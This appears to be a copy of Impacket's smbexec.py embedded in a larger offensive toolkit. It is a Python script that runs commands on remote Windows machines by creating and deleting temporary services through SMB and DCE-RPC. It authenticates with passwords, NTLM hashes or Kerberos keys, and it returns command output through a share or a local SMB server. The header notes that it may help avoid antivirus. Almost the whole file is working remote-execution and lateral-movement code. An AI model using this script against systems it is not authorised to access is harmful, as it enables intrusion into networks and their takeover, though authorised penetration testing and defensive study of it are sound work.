#!/usr/bin/python
# Copyright (c) 2003-2015 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A similar approach to psexec w/o using RemComSvc. The technique is described here
# http://www.accuvant.com/blog/owning-computers-without-shell-access
# Our implementation goes one step further, instantiating a local smbserver to receive the 
# output of the commands. This is useful in the situation where the target machine does NOT
# have a writeable share available.
# Keep in mind that, although this technique might help avoiding AVs, there are a lot of 
# event logs generated and you can't expect executing tasks that will last long since Windows 
# will kill the process since it's not responding as a Windows service. 
# Certainly not a stealthy way.
#
# This script works in two ways:
# 1) share mode: you specify a share, and everything is done through that share.
# 2) server mode: if for any reason there's no share available, this script will launch a local
#    SMB server, so the output of the commands executed are sent back by the target machine
#    into a locally shared folder. Keep in mind you would need root access to bind to port 445 
#    in the local machine.
# 
# Author:
#  beto (@agsolino)
#
# Reference for:
#  DCE/RPC and SMB.

import sys
import os
import cmd
import argparse
import ConfigParser
import logging

from core.logger import *
from impacket import version, smbserver
from impacket.smbconnection import *
from impacket.dcerpc.v5 import transport, scmr

OUTPUT_FILENAME = ''.join(random.sample(string.ascii_letters, 10))
BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10))

class CMDEXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }


    def __init__(self, command, protocols = None, username = '', password = '', domain = '', hashes = None, aesKey = None, doKerberos = None, mode = None, share = None):
        if not protocols:
            protocols = CMDEXEC.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__command  = command
        self.__protocols = [protocols]
        self.__serviceName = ''.join(random.sample(string.ascii_letters, 10))
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__share = share
        self.__mode  = mode
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        for protocol in self.__protocols:
            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            logging.info("Trying protocol %s..." % protocol)
            logging.info("Creating service %s..." % self.__serviceName)

            stringbinding = protodef[0] % addr

            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)

            if hasattr(rpctransport,'preferred_dialect'):
               rpctransport.preferred_dialect(SMB_DIALECT)
            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos)

            self.shell = None
            try:
                if self.__mode == 'SERVER':
                    serverThread = SMBServer()
                    serverThread.daemon = True
                    serverThread.start()
                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName)
                self.shell.onecmd(self.__command)
                if self.__mode == 'SERVER':
                    serverThread.stop()
            except  (Exception, KeyboardInterrupt), e:
                #import traceback
                #traceback.print_exc()
                logging.critical(str(e))
                if self.shell is not None:
                    self.shell.finish()
                sys.stdout.flush()
                sys.exit(1)

class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\Windows\\Temp\\' + OUTPUT_FILENAME 
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute'

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception, e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect() 
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or mantain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ' )
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = string.replace(self.__outputBuffer,'\r\n','') + '>'
            self.__outputBuffer = ''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, self.__output, output_callback)
            self.transferClient.deleteFile(self.__share, self.__output)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile 

        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''